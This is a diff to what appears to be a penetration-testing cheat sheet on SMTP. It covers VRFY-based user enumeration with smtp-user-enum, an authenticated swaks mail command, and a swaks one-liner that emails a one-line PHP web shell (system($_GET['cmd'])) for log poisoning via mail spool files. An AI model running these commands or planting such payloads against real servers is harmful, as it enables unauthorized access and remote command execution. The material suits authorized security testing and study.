@@ -15,8 +15,7 @@ title = "🌐 SMTP/ESMTP: TCP 25/465/587"
 - https://github.com/cytopia/smtp-user-enum#how-does-vrfy-work
 
 ```bash
-wget https://raw.githubusercontent.com/cytopia/smtp-user-enum/refs/heads/master/smtp-user-enum
-
+# Find only users
 python3 ./smtp-user-enum --mode VRFY --file /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt --domain <DOMAIN> <TARGET> 25
 
 # Will likely find common services/machine users
@@ -38,9 +37,14 @@ EXPN
 - `/var/mail/<USER>`
 - `/var/spool/mail/<USER>`
 
-**Tip:** keep the PHP payload simple and on one line -- multiline can break in mail formatting. Avoid `!` and special chars that SMTP may encode.
+```bash
+sudo swaks --suppress-data --server <SMTP_TARGET> -ap --auth-user <USER> --auth-password '<PASSWORD>' --from <FROM_EMAIL> --to <TO_EMAIL> --header "<SUBJECT>" --body @<BODY> --attach @<ATTACHMENT>
+```
+
+### PHP Webshell via Email
+
+**NOTE:** keep the PHP payload simple and on one line: multiline can break in mail formatting. Avoid `!` and special chars that SMTP may encode
 
 ```bash
-# Body: for log poisoning or running scripts
 swaks --server <TARGET> --to <USER> --from test --header "Subject: test" --body '<?php system($_GET["cmd"]); ?>'
 ```
